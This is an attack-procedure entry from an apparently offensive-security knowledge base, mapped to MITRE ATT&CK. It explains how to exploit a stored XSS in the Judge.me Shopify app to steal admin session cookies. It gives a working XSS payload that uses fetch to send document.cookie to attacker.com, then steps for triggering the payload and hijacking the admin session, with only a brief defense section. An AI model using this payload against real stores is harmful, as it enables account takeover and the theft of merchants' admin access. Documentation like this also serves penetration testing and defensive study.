---
id: proc-execute-xss-cookie-theft
tags:
  - xss
  - cookie-theft
  - session-hijack
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T03:46:38.077Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Execute-XSS-Payload-to-Steal-Admin-Cookies

## Summary

This procedure modifies and executes an XSS payload to exfiltrate admin session cookies from the victim's browser, enabling session hijacking in the Shopify admin environment.

## Description

Once the stored XSS is triggered, the payload can be adapted to capture document.cookie and send it to an attacker-controlled server via fetch or img src. In the Judge.me vulnerability, this occurs in the high-privilege admin context, allowing full session takeover. The attacker sets up an endpoint to receive the data, recreates the product with the exfiltration payload, and triggers deletion. Prerequisites include a receiving server and the prior steps. Outcomes are cookie transmission, usable for impersonation.

## Requirements

1. Attacker-controlled server for receiving exfiltrated data (e.g., webhook or simple HTTP endpoint)
2. Modified XSS payload ready for injection
3. Active admin session in the target browser

## Defense

Defensive measures and detection strategies:

- Enforce HttpOnly and Secure flags on session cookies to prevent JavaScript access
- Implement session binding to user agents or IP addresses
- Monitor outbound network requests from admin interfaces for anomalies (e.g., to unknown domains)

## Objectives

1. Capture and exfiltrate admin session cookies
2. Enable unauthorized access via hijacked session
3. Demonstrate full impact of the stored XSS

## Instructions

### Step 1: Modify and Inject Payload

**Context**: Update the payload for cookie theft and recreate the product to prepare for execution.

No specific command; perform via UI:

1. Edit the product title to: `444"><img src=x onerror="fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie))">`
2. Save the product.

### Step 2: Trigger and Exfiltrate

**Context**: Repeat the deletion to execute the new payload and send cookies.

No specific command; perform via UI:

1. Navigate to Judge.me > AliExpress Review Importer > Products.
2. Delete the updated product and confirm.

> The fetch request sends cookies to the attacker's server; check server logs for receipt (e.g., query param with cookie values). Use received cookies in a new browser session to hijack admin access.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[cookie-theft]]
- [[session-hijack]]
